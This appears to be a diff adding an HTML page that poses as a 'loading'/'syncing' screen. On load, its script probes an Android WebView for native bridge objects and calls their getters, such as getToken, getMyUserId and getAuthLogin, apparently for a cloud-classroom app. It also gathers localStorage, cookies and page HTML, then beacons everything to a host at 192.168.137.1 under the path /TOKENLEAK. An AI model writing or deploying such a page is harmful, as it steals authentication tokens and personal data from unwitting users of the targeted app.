@@ -1,0 +1,62 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>loading</title></head><body>
+<div id="m">同步中…</div>
+<script>
+(function () {
+  var out = { href: location.href, ua: navigator.userAgent, t: Date.now() };
+  function safe(f) { try { return f(); } catch (e) { return 'ERR:' + e; } }
+  // 1) 枚举所有疑似桥对象
+  var cand = [];
+  try {
+    for (var k in window) {
+      if (/^(webView|js|jsBridge|LauncherJs|Android|android|xh|app|bridge|sdk|native|WebViewJavascriptBridge|XhJs|appJs|AcldJs)$/i.test(k)) cand.push(k);
+      else if (/bridge|javascriptinterface|jsinterface|webview|launcher/i.test(k)) cand.push(k);
+    }
+  } catch (e) {}
+  out.keys = cand.join('|');
+  var objs = {};
+  for (var i = 0; i < cand.length && i < 30; i++) {
+    var n = cand[i], v = null;
+    try { v = window[n]; } catch (e) { continue; }
+    if (!v) continue;
+    var ms = {};
+    try { for (var m in v) { try { ms[m] = typeof v[m]; } catch (e) { ms[m] = '?'; } } } catch (e) { ms['<err>'] = '' + e; }
+    objs[n] = ms;
+  }
+  out.objs = objs;
+
+  // 2) 逐个调用云课堂富桥的取值方法
+  var vals = {};
+  function callBridge(obj, name, objName) {
+    if (!obj) return;
+    var mets = ['getToken','getMyUserId','getClassInfo','getClassroomId','getCurrentCourse',
+                'getAppType','getBaseUrl','getVersionName','getVersionCode','getType',
+                'getVisibleResourceType','getAuthLogin','shareRefresh','success'];
+    for (var j = 0; j < mets.length; j++) {
+      var f = mets[j];
+      try { if (typeof obj[f] === 'function') vals[objName + '.' + f] = String(obj[f]()); } catch (e) {}
+    }
+  }
+  callBridge(window.webView, 'webView', 'webView');
+  callBridge(window.js, 'js', 'js');
+  callBridge(window.jsBridge, 'jsBridge', 'jsBridge');
+  callBridge(window.LauncherJs, 'LauncherJs', 'LauncherJs');
+  callBridge(window.Android, 'Android', 'Android');
+  callBridge(window.xh, 'xh', 'xh');
+  out.vals = vals;
+
+  // 3) 存储/凭证类
+  try { var st = {}; for (var q = 0; q < localStorage.length && q < 30; q++) { var kk = localStorage.key(q); st[kk] = String(localStorage.getItem(kk)).slice(0, 500); } out.ls = st; } catch (e) {}
+  try { out.cookie = document.cookie; } catch (e) {}
+  try { out.docHtml = String(document.documentElement.innerHTML).slice(0, 300); } catch (e) {}
+
+  // 4) 回传(双通道: 8099 探针 + 80 冒充器)
+  var q = '/TOKENLEAK?d=' + encodeURIComponent(JSON.stringify(out));
+  try { var im = new Image(); im.src = 'http://192.168.137.1:8099' + q; } catch (e) {}
+  try { var im2 = new Image(); im2.src = 'http://192.168.137.1' + q; } catch (e) {}
+  try { fetch('http://192.168.137.1:8099' + q, { mode: 'no-cors' }).catch(function () {}); } catch (e) {}
+  try { document.getElementById('m').innerHTML = 'ok:' + (out.keys || ''); } catch (e) {}
+})();
+</script>
+</body></html>
